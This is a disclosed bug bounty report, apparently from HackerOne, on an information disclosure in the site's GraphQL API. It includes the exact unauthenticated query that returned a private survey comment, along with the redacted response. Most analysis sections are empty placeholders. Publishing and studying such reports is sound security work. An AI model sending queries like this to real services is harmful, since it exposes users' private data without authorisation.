# Team object in GraphQL disclosed private_comment

## Metadata
- **Source:** HackerOne
- **Report:** 978143 | https://hackerone.com/reports/978143
- **Submitted:** 2020-09-10
- **Reporter:** haxta4ok00
- **Program:** Unknown
- **Bounty:** $2,500
- **Severity:** medium
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
**Summary:**
Hi Team, Some private(I think) part of GraphQL reveals to us

### Steps To Reproduce
Without authorization

1. https://hackerone.com/graphql 

POST:

`{"query":"query { node(id: \\"gid://hackerone/SurveyRatingItem/█████\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_ratin

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Summary:**
Hi Team, Some private(I think) part of GraphQL reveals to us

### Steps To Reproduce
Without authorization

1. https://hackerone.com/graphql 

POST:

`{"query":"query { node(id: \\"gid://hackerone/SurveyRatingItem/█████\\") { ... on SurveyRatingItem{_id,pentester{_id},team{_id},key,private_comment,public_comment,rating,recipient{username,email},subject{... on Report{_id}},survey_rating{_id,team{_id},state,respondent{_id,username,email,pentests{nodes{_id}}}}}}}","variables":{}}`

`{"data":{"node":{"_id":"████████","pentester":null,"team":null,"key":"scope","private_comment":"████","public_comment":null,"rating":1,"recipient":null,"subject":null,"survey_rating":{"_id":"█████","team":null,"state":"completed","respondent":{"_id":"████","username":"███","email":null,"pentests":{"nodes":[]}}}}}}`

As we can see, the `key` field takes the value `scope`, we don't see in which program this happens, but we can see the comments of the participant, and as we can see, it has the status private

PS. Yes, we do not see some data, but in the future they may be disclosed in the comments (I think so)

## Impact

disclosed private_comment

</details>

---
*Analysed by Claude on 2026-05-24*
